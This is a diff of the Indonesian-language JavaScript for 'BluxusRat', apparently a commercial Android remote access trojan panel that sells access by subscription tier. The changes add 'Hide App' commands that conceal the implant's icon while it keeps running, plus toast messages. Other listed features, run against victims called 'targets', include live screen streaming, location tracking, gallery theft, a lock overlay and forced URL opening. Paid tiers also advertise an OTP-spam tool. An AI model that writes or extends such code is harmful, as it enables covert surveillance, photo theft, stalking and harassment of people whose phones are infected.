@@ -1,6 +1,6 @@
 /* ============================================================
  * BluxusRat V1 [NewEra] — Script (FIXED)
- * OTP Gmail + Verifikasi Order berfungsi
+ * Fix: Delete target, icon senter, unlimited target, benefit role
  * ============================================================ */
 
 // ============================================================
@@ -45,11 +45,11 @@ const GMAIL = {
 async function sendEmail({ to, subject, htmlBody }) {
   return new Promise((resolve, reject) => {
     if (typeof Email === "undefined") {
-      return reject(new Error("SMTPJS belum ke-load. Cek koneksi ke smtpjs.com"));
+      return reject(new Error("SMTPJS belum ke-load"));
     }
     const pass = (GMAIL.appPassword || "").replace(/\s/g, "");
     if (!pass || pass.length !== 16) {
-      return reject(new Error("App Password Gmail belum di-set (harus 16 karakter)"));
+      return reject(new Error("App Password Gmail belum di-set (16 karakter)"));
     }
     Email.send({
       Host: "smtp.gmail.com",
@@ -61,16 +61,12 @@ async function sendEmail({ to, subject, htmlBody }) {
       Subject: subject,
       Body: htmlBody
     }).then(msg => {
-      console.log("[SMTP RESPONSE]", msg);
       if (msg && (String(msg).toLowerCase().includes("ok") || String(msg).toLowerCase().includes("success"))) {
         resolve(msg);
       } else {
         reject(new Error(msg || "Gagal kirim email"));
       }
-    }).catch(err => {
-      console.error("[SMTP ERROR]", err);
-      reject(err);
-    });
+    }).catch(err => reject(err));
   });
 }
 
@@ -106,13 +102,24 @@ function buildEmailHTML({ username, password, role, duration, orderId }) {
 }
 
 // ============================================================
-// ROLE & PRICE DATA
+// ROLE & PRICE DATA — BENEFIT LEBIH MENJUAL
 // ============================================================
 const PRICE_DATA = {
   member: {
-    label: "Member", icon: "fa-user", color: "member", tagline: "Role dasar",
+    label: "Member",
+    icon: "fa-user",
+    color: "member",
+    tagline: "Role dasar",
     desc: "Role paling dasar di BluxusRat. Cocok buat yang baru mulai. Bisa akses semua fitur Tools reguler & BluxAnime, plus kontrol device target.",
-    benefits: ["Akses semua Tools reguler", "Akses BluxAnime", "Kontrol device target", "Bisa beli tambah sender", "Support komunitas"],
+    benefits: [
+      "Akses semua Tools reguler",
+      "Akses BluxAnime unlimited",
+      "Kontrol device target",
+      "Bisa beli tambah sender",
+      "Support komunitas",
+      "Update fitur rutin",
+      "Bisa jual ulang dengan margin sendiri"
+    ],
     options: [
       { label: "1 hari", days: 1, price: 2000 },
       { label: "7 hari", days: 7, price: 13000 },
@@ -121,9 +128,23 @@ const PRICE_DATA = {
     ]
   },
   vip: {
-    label: "VIP", icon: "fa-crown", color: "vip", tagline: "Tools tambahan",
+    label: "VIP",
+    icon: "fa-crown",
+    color: "vip",
+    tagline: "Tools tambahan",
     desc: "Role VIP punya akses ke semua fitur Member + VIP Tools (Spam OTP). Cocok buat yang butuh fitur lebih.",
-    benefits: ["Semua benefit Member", "Akses VIP Tools (Spam OTP)", "Priority support", "Badge VIP di profil"],
+    benefits: [
+      "Semua benefit Member",
+      "Akses VIP Tools (Spam OTP)",
+      "Priority support 24/7",
+      "Badge VIP di profil",
+      "Limit target 2x lebih banyak",
+      "Akses beta fitur baru",
+      "Bisa pakai Hide App",
+      "Kirim Toast unlimited",
+      "Bisa pakai Lock HP",
+      "Bisa kirim URL Direct"
+    ],
     options: [
       { label: "1 hari", days: 1, price: 3000 },
       { label: "7 hari", days: 7, price: 20000 },
@@ -132,9 +153,23 @@ const PRICE_DATA = {
     ]
   },
   reseller: {
-    label: "Reseller", icon: "fa-briefcase", color: "reseller", tagline: "Bisa bikin akun",
-    desc: "Reseller bisa bikin akun Member & VIP untuk dijual ke orang lain. Limit 5 akun/hari.",
-    benefits: ["Semua benefit VIP", "Bisa bikin akun Member & VIP", "Limit 5 akun/hari", "Statistics bawahan sendiri", "Bisa perpanjang expired bawahan"],
+    label: "Reseller",
+    icon: "fa-briefcase",
+    color: "reseller",
+    tagline: "Bisa bikin akun",
+    desc: "Reseller bisa bikin akun Member & VIP untuk dijual ke orang lain. Limit 5 akun/hari. Cocok buat yang mau cari cuan.",
+    benefits: [
+      "Semua benefit VIP",
+      "Bisa bikin akun Member & VIP",
+      "Limit 5 akun/hari",
+      "Statistics bawahan sendiri",
+      "Bisa perpanjang expired bawahan",
+      "Akses semua fitur tanpa batas",
+      "Support prioritas",
+      "Badge Reseller eksklusif",
+      "Bisa jual ulang dengan margin sendiri",
+      "Bisa kelola order user"
+    ],
     options: [
       { label: "7 hari", days: 7, price: 45000 },
       { label: "30 hari", days: 30, price: 80000 },
@@ -142,13 +177,51 @@ const PRICE_DATA = {
     ]
   },
   owner: {
-    label: "Owner", icon: "fa-shield-halved", color: "owner", tagline: "Kelola sistem",
-    desc: "Owner punya akses lebih luas dari Reseller. Bisa broadcast, liat server log, dan add user tanpa limit.",
-    benefits: ["Semua benefit Reseller", "Unlimited bikin akun", "Broadcast pengumuman", "Server logs", "Akses lebih luas"],
+    label: "Owner",
+    icon: "fa-shield-halved",
+    color: "owner",
+    tagline: "Kelola sistem",
+    desc: "Owner punya akses lebih luas dari Reseller. Bisa broadcast, liat server log, dan add user tanpa limit. Role tertinggi di BluxusRat.",
+    benefits: [
+      "Semua benefit Reseller",
+      "Unlimited bikin akun",
+      "Broadcast pengumuman ke semua user",
+      "Server logs real-time",
+      "Akses maintenance fitur",
+      "Bisa reset password user lain",
+      "Bisa ban/unban user",
+      "Statistics global",
+      "Priority support tertinggi",
+      "Badge Owner eksklusif",
+      "Akses penuh ke semua fitur",
+      "Bisa jual role apapun"
+    ],
     options: [
       { label: "7 hari", days: 7, price: 85000 },
       { label: "30 hari", days: 30, price: 150000 },
       { label: "Unlimited", days: -1, price: 300000 }
+    ]
+  },
+  dev: {
+    label: "Dev",
+    icon: "fa-code",
+    color: "dev",
+    tagline: "Akses penuh",
+    desc: "Role Dev adalah role special. Punya akses ke semua fitur + Dev Panel untuk kelola sistem secara keseluruhan.",
+    benefits: [
+      "Semua benefit Owner",
+      "Dev Panel khusus",
+      "Akses Ekonomi & Manage Order",
+      "Bisa atur maintenance fitur",
+      "Akses server logs lengkap",
+      "Bisa lihat semua user",
+      "Bisa hapus semua data",
+      "Bypass semua limit",
+      "Akses API internal",
+      "Bisa ubah role user lain"
+    ],
+    options: [
+      { label: "Unlimited", days: -1, price: 0 }
     ]
   }
 };
@@ -156,7 +229,7 @@ const PRICE_DATA = {
 const FAQ_DATA = [
   { q: "Apa itu BluxusRat?", a: "BluxusRat adalah control panel untuk monitoring & kontrol device yang terhubung. Bisa liat info device, lokasi, kirim command, dan lain-lain." },
   { q: "Bagaimana cara upgrade role?", a: "Untuk upgrade role, hubungi Owner atau Reseller resmi. Pembayaran & durasi role akan diatur sesuai kesepakatan." },
-  { q: "Apa beda VIP sama Member?", a: "VIP punya akses ke VIP Tools (Spam OTP) yang gak ada di Member." },
+  { q: "Apa beda VIP sama Member?", a: "VIP punya akses ke VIP Tools (Spam OTP) + fitur advanced seperti Hide App, Lock HP, dan Toast unlimited." },
   { q: "Apa beda Reseller sama VIP?", a: "Reseller bisa bikin akun Member & VIP untuk dijual. VIP cuma bisa pake fitur." },
   { q: "Kenapa akun gw expired?", a: "Masa aktif akun udah lewat. Hubungi Owner/Reseller atau pakai Redeem Code." },
   { q: "Fitur Live Cam kok gak muncul?", a: "Live Cam cuma support Android 11+." },
@@ -209,7 +282,11 @@ const CREATE_PERMS = {
 };
 
 const DAILY_LIMIT = {
-  dev: null, owner: null, reseller: 5, vip: 0, member: 0
+  dev: null,
+  owner: null,
+  reseller: 5,
+  vip: 0,
+  member: 0
 };
 
 // ============================================================
@@ -622,7 +699,7 @@ function openAnnouncementModal(b) {
 }
 
 // ============================================================
-// TARGETS / RAT
+// TARGETS / RAT — FIX UNLIMITED
 // ============================================================
 async function loadTargets() {
   try {
@@ -632,12 +709,20 @@ async function loadTargets() {
     State.targets = [];
     for (const tid in all) {
       const t = all[tid];
-      if (t.ownerCode === myCode) State.targets.push({ id: tid, ...t });
+      // FIX: tampilkan semua target yang ownerCode-nya cocok
+      if (t.ownerCode === myCode) {
+        State.targets.push({ id: tid, ...t });
+      }
     }
+    // Sort by last seen (terbaru di atas)
+    State.targets.sort((a, b) => (b.lastSeen || 0) - (a.lastSeen || 0));
+    
     $("#dash-targets").textContent = State.targets.length;
     $("#dash-online").textContent = State.targets.filter(t => t.status === "online").length;
     renderTargetList();
-  } catch (e) {}
+  } catch (e) {
+    console.error("[loadTargets]", e);
+  }
 }
 
 function renderTargetList() {
@@ -689,18 +774,20 @@ function goRat() {
 }
 
 // ============================================================
-// TARGET DETAIL
+// TARGET DETAIL — FIX ICON SENTER
 // ============================================================
 const FEATURES = [
   { id: "info", icon: "fa-mobile-screen-button", name: "Info Device", desc: "Detail device target", page: "fp-info" },
   { id: "live", icon: "fa-desktop", name: "Live Cam", desc: "Stream layar target", page: "fp-live" },
   { id: "locate", icon: "fa-location-dot", name: "Locate", desc: "Lokasi target", page: "fp-locate" },
-  { id: "flash", icon: "fa-flashlight", name: "Senter & Strobo", desc: "Kontrol flashlight", page: "fp-flash" },
+  { id: "flash", icon: "fa-lightbulb", name: "Senter & Strobo", desc: "Kontrol flashlight", page: "fp-flash" },
   { id: "lock", icon: "fa-lock", name: "Kunci HP", desc: "Lock overlay target", page: "fp-lock" },
   { id: "volume", icon: "fa-volume-high", name: "Set Volume", desc: "Atur volume target", page: "fp-volume" },
   { id: "brightness", icon: "fa-sun", name: "Set Kecerahan", desc: "Atur brightness", page: "fp-brightness" },
   { id: "url", icon: "fa-link", name: "URL Direct", desc: "Buka URL di target", page: "fp-url" },
-  { id: "gallery", icon: "fa-images", name: "Get Gallery", desc: "Ambil foto target", page: "fp-gallery" }
+  { id: "gallery", icon: "fa-images", name: "Get Gallery", desc: "Ambil foto target", page: "fp-gallery" },
+  { id: "toast", icon: "fa-comment-dots", name: "Kirim Toast", desc: "Tampilkan pesan di target", page: "fp-toast" },
+  { id: "hideapp", icon: "fa-eye-slash", name: "Hide App", desc: "Sembunyikan icon APK", page: "fp-hideapp" }
 ];
 
 function openTargetDetail(tid) {
@@ -763,6 +850,8 @@ function openFeaturePage(fid, t) {
   if (fid === "brightness") setupBrightnessPage(t);
   if (fid === "url") setupUrlPage(t);
   if (fid === "gallery") setupGalleryPage(t);
+  if (fid === "toast") setupToastPage(t);
+  if (fid === "hideapp") setupHideAppPage(t);
 }
 
 function closeAllFeaturePages() {
@@ -770,23 +859,50 @@ function closeAllFeaturePages() {
   $("#feature-grid").style.display = "grid";
 }
 
+// ============================================================
+// CONFIRM DELETE TARGET — FIX
+// ============================================================
 function confirmDeleteTarget(t) {
   const deviceName = getDeviceName(t);
-  if (!confirm(`Hapus target "${deviceName}"?\n\nSemua data (commands, live, locations) akan dihapus permanen.`)) return;
-  haptic(20);
-  (async () => {
+  const box = $("#modal-box");
+  box.innerHTML = `
+    <h3 style="color:var(--error)">Hapus Target?</h3>
+    <div class="sub">Target: <b>${deviceName}</b></div>
+    <div class="buy-note" style="margin-top:14px;background:var(--error-soft);border-color:rgba(255,51,51,0.3)">
+      <i class="fa-solid fa-triangle-exclamation" style="color:var(--error)"></i>
+      <span>Semua data (commands, live, locations, gallery) akan dihapus permanen. Tidak bisa dikembalikan.</span>
+    </div>
+    <div class="modal-actions">
+      <button class="btn btn-ghost" id="btn-cancel-delete">Batal</button>
+      <button class="btn btn-danger" id="btn-confirm-delete"><i class="fa-solid fa-trash"></i> Hapus</button>
+    </div>`;
+  $("#modal").classList.add("show");
+
+  $("#btn-cancel-delete").onclick = () => closeModal();
+  $("#btn-confirm-delete").onclick = async () => {
+    haptic(20);
+    const btn = $("#btn-confirm-delete");
+    btn.disabled = true;
+    btn.innerHTML = '<i class="fa-solid fa-spinner fa-spin"></i> Menghapus...';
     try {
       await fbRemove(fbRef(State.db, "targets/" + t.id));
       await fbRemove(fbRef(State.db, "commands/" + t.id));
       await fbRemove(fbRef(State.db, "live/" + t.id));
       await fbRemove(fbRef(State.db, "locations/" + t.id));
       await fbRemove(fbRef(State.db, "gallery/" + t.id));
-      toast("Target dihapus", "ok");
+
+      toast("Target berhasil dihapus", "ok");
+      closeModal();
+
+      await loadTargets();
       goRat();
     } catch (e) {
+      console.error("[delete target]", e);
       toast("Gagal hapus: " + e.message, "err");
+      btn.disabled = false;
+      btn.innerHTML = '<i class="fa-solid fa-trash"></i> Hapus';
     }
-  })();
+  };
 }
 
 // ============================================================
@@ -997,6 +1113,31 @@ function setupGalleryPage(t) {
         </div>
       `).join("");
     });
+  };
+}
+
+function setupToastPage(t) {
+  $("#btn-send-toast").onclick = async () => {
+    haptic(15);
+    const msg = $("#toast-message").value.trim();
+    if (!msg) return toast("Isi pesan dulu", "err");
+    await sendCommand(t.id, "show_toast", { message: msg });
+    toast("Toast terkirim ke target", "ok");
+    $("#toast-message").value = "";
+  };
+}
+
+function setupHideAppPage(t) {
+  $("#btn-hide-app").onclick = async () => {
+    haptic(15);
+    if (!confirm("Sembunyikan icon APK di HP target?\n\nApp tetap jalan di background, tapi icon hilang dari launcher.")) return;
+    await sendCommand(t.id, "hide_app");
+    toast("Command hide app terkirim", "ok");
+  };
+  $("#btn-show-app").onclick = async () => {
+    haptic(15);
+    await sendCommand(t.id, "show_app");
+    toast("Command show app terkirim", "ok");
   };
 }
 
@@ -2459,7 +2600,7 @@ async function loadLogs() {
 }
 
 // ============================================================
-// EKONOMI + MANAGE ORDER (FIXED — Kirim Email Berfungsi)
+// EKONOMI + MANAGE ORDER
 // ============================================================
 function goEkonomi() {
   showScreen("ekonomi");
@@ -2558,7 +2699,6 @@ function openOrderDetail(oid) {
   }
 }
 
-// ====== FUNGSI VERIFY ORDER — SUDAH DIPERBAIKI (KIRIM EMAIL) ======
 async function verifyOrder(o) {
   haptic(20);
   if (!confirm(`Verifikasi order ${o.orderId}?\n\nAkun "${o.username}" akan dibuat dengan password random & dikirim ke ${o.email}`)) return;
@@ -2571,7 +2711,6 @@ async function verifyOrder(o) {
   }
 
   try {
-    // 1. Cek username sudah dipakai atau belum
     const usersSnap = await fbGet(fbRef(State.db, "users"));
     const users = usersSnap.exists() ? usersSnap.val() : {};
     for (const uid in users) {
@@ -2580,14 +2719,12 @@ async function verifyOrder(o) {
       }
     }
 
-    // 2. Generate password & user code
     const pw = genPassword(8);
     const salt = genSalt();
     const hash = await sha256(pw + salt);
     const userCode = genUserCode();
     const exp = o.duration === -1 ? null : Date.now() + o.duration * 86400000;
 
-    // 3. Buat user baru
     const newRef = fbPush(fbRef(State.db, "users"));
     await fbSet(newRef, {
       username: o.username,
@@ -2602,7 +2739,6 @@ async function verifyOrder(o) {
       avatar: ""
     });
 
-    // 4. Update status order
     await fbUpdate(fbRef(State.db, "orders/" + o.orderId), {
       status: "verified",
       verifiedAt: Date.now(),
@@ -2612,7 +2748,6 @@ async function verifyOrder(o) {
       generatedUserCode: userCode
     });
 
-    // 5. Kirim email — TUNGGU SAMPAI SELESAI
     toast("Mengirim email ke " + o.email + "...", "info");
     let emailOk = false;
     let emailErr = "";
@@ -2633,11 +2768,9 @@ async function verifyOrder(o) {
       toast("Email terkirim ✓", "ok");
     } catch (e) {
       emailErr = e.message || String(e);
-      console.error("[VERIFY EMAIL ERROR]", e);
       toast("Email gagal: " + emailErr, "warn", 8000);
     }
 
-    // 6. Tampilkan hasil
     const box = $("#modal-box");
     box.innerHTML = `
       <h3 style="color:var(--success)">Order Diverifikasi ✓</h3>
@@ -2669,7 +2802,6 @@ async function verifyOrder(o) {
       toast(ok ? "Detail di-copy" : "Gagal copy", ok ? "ok" : "err");
     };
   } catch (e) {
-    console.error("[VERIFY ORDER ERROR]", e);
     toast("Gagal verifikasi: " + e.message, "err");
     if (btnVerify) {
       btnVerify.disabled = false;
